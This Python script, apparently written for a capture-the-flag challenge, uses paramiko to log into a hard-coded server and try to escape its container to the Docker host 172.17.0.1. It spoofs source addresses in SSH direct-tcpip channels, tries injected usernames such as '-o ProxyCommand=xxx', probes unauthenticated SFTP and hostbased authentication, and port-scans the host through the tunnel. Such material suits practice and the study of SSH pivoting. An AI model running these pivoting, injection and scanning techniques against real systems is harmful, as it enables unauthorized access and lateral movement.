import paramiko
import socket
import time
import sys
import struct

"""
重新思考FakeJumpServer攻击

题目提示：
1. "使用SSH的某些特性" 
2. "类似FakeJumpServer"
3. "第二次SSH连接的报错有用"
4. "用户名密码注入无关"

FakeJumpServer攻击的核心是：
当客户端通过跳板机连接到目标时，跳板机可以：
1. 不转发请求，而是自己响应（我们已经确认对localhost是这样）
2. 劫持认证流程

但我们需要的是"逃逸"到宿主机，不是捕获凭据...

让我想想另一个角度：
- dropbear对localhost返回自己的host key
- 这意味着它在"伪装"成localhost
- 如果我们能让它"伪装"成172.17.0.1呢？

或者：
- 如果dropbear有某种配置，允许某些特殊的连接方式？
- 比如通过特定的用户名或主机名触发特殊行为？

让我测试一下各种边界情况
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(transport, cmd, timeout=10):
    """执行命令"""
    try:
        session = transport.open_session()
        session.exec_command(cmd)
        session.settimeout(timeout)
        out = b""
        try:
            while True:
                chunk = session.recv(4096)
                if not chunk:
                    break
                out += chunk
        except socket.timeout:
            pass
        return out.decode()
    except Exception as e:
        return f"Error: {e}"

def test_special_direct_tcpip_params():
    """测试direct-tcpip的特殊参数"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试特殊的direct-tcpip参数...")
    
    # 测试不同的源地址
    test_cases = [
        # (dest_host, dest_port, src_host, src_port)
        ("172.17.0.1", 22, "172.17.0.1", 22),  # 伪装来自宿主机
        ("172.17.0.1", 22, "127.0.0.1", 22),   # 伪装来自localhost
        ("172.17.0.1", 22, "0.0.0.0", 0),
        ("localhost", 22, "172.17.0.1", 22),   # 反向
    ]
    
    for dest_host, dest_port, src_host, src_port in test_cases:
        print(f"\n测试: dest={dest_host}:{dest_port}, src={src_host}:{src_port}")
        try:
            channel = transport.open_channel(
                "direct-tcpip",
                (dest_host, dest_port),
                (src_host, src_port)
            )
            
            # 读取banner
            channel.settimeout(3)
            banner = channel.recv(100)
            print(f"  Banner: {banner[:60]}")
            
            channel.close()
        except Exception as e:
            print(f"  错误: {e}")
    
    ssh.close()

def test_hostbased_auth():
    """
    测试基于主机的认证
    
    如果dropbear支持hostbased认证，并且我们能伪造源地址...
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试hostbased认证...")
    
    # 连接到172.17.0.1
    channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
    target_transport = paramiko.Transport(channel)
    target_transport.start_client()
    
    # 检查支持的认证方法
    try:
        target_transport.auth_none("root")
    except paramiko.BadAuthenticationType as e:
        print(f"支持的认证方法: {e.allowed_types}")
    
    target_transport.close()
    ssh.close()

def test_user_at_host():
    """
    测试user@host格式的用户名
    
    SSH支持在用户名中包含@，这可能会产生有趣的行为
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试特殊用户名...")
    
    users = [
        "ctf@172.17.0.1",
        "root@172.17.0.1",
        "ctf@localhost",
        "-o ProxyCommand=xxx",
        "ctf%172.17.0.1",
        "ctf/172.17.0.1",
    ]
    
    for user in users:
        print(f"\n测试用户名: {user}")
        try:
            channel = transport.open_channel("direct-tcpip", ("localhost", 22), ('127.0.0.1', 0))
            t = paramiko.Transport(channel)
            t.start_client()
            t.auth_password(user, PASSWD)
            print(f"  成功!")
            print(f"  id: {exec_cmd(t, 'id')}")
            t.close()
        except paramiko.AuthenticationException:
            print(f"  认证失败")
        except Exception as e:
            print(f"  错误: {e}")
    
    ssh.close()

def test_escape_sequence():
    """
    测试转义序列
    
    SSH会话中的 ~. ~C 等转义序列可能有特殊效果
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试转义序列...")
    
    # 获取PTY shell
    channel = transport.open_session()
    channel.get_pty()
    channel.invoke_shell()
    
    time.sleep(0.5)
    if channel.recv_ready():
        print(f"欢迎: {channel.recv(1024).decode()}")
    
    # 发送转义序列
    sequences = [
        "~?",  # 帮助
        "~#",  # 列出转发
        "~C",  # 命令行
    ]
    
    for seq in sequences:
        print(f"\n测试 '{seq}':")
        channel.send(seq + "\n")
        time.sleep(0.5)
        if channel.recv_ready():
            print(channel.recv(1024).decode())
    
    channel.close()
    ssh.close()

def test_port_forwarding_to_flag():
    """
    测试反向端口转发获取信息
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试反向端口转发...")
    
    # 请求反向端口转发
    try:
        port = transport.request_port_forward('', 0)
        print(f"反向端口转发开启，端口: {port}")
        
        # 在容器中检查
        print("检查端口:", exec_cmd(transport, f"cat /proc/net/tcp"))
        
        transport.cancel_port_forward('', port)
    except Exception as e:
        print(f"错误: {e}")
    
    ssh.close()

def try_reading_172_17_0_1_files():
    """
    尝试通过某种方式读取172.17.0.1上的文件
    
    思路：如果我们能通过SFTP或其他方式...
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 尝试读取远程文件...")
    
    # 尝试连接到172.17.0.1的SFTP
    channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
    target_transport = paramiko.Transport(channel)
    target_transport.start_client()
    
    # 不认证，直接尝试请求sftp子系统
    print("尝试直接请求SFTP子系统（不认证）...")
    try:
        channel2 = target_transport.open_session()
        channel2.invoke_subsystem("sftp")
        print("SFTP子系统请求成功!")
        channel2.close()
    except Exception as e:
        print(f"失败: {e}")
    
    target_transport.close()
    ssh.close()

def scan_for_services():
    """扫描可能的服务"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 扫描172.17.0.1的服务...")
    
    ports = [21, 22, 23, 25, 53, 80, 110, 111, 139, 443, 445, 993, 995, 
             2222, 3306, 5432, 6379, 8000, 8080, 8443, 9000, 27017]
    
    for port in ports:
        try:
            channel = transport.open_channel("direct-tcpip", ("172.17.0.1", port), ('127.0.0.1', 0), timeout=2)
            channel.settimeout(2)
            try:
                banner = channel.recv(100)
                print(f"  端口{port}开放: {banner[:50]}")
            except:
                print(f"  端口{port}开放 (无banner)")
            channel.close()
        except:
            pass
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 边界情况测试")
    print("="*60)
    
    print("\n[1] 测试特殊direct-tcpip参数")
    test_special_direct_tcpip_params()
    
    print("\n[2] 测试特殊用户名")
    test_user_at_host()
    
    print("\n[3] 测试hostbased认证")
    test_hostbased_auth()
    
    print("\n[4] 扫描172.17.0.1服务")
    scan_for_services()
